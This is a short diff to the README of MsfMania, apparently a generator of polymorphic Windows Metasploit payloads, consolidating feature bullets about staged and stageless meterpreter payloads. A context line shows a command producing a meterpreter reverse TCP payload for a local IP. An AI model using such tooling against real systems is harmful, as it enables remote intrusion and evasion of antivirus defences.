@@ -40,8 +40,7 @@ python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.25
 ```
 
 ## Features
-- x86/x64 staged payload meterpreter/shell.
-- x86/x64 stageless payload meterpreter/shell.
+- x86/x64 staged/stageless windows payload meterpreter/shell.
 - Cross-compiler MinGW.
 - Polymorphic C source code.
 - Strip with MinGW.
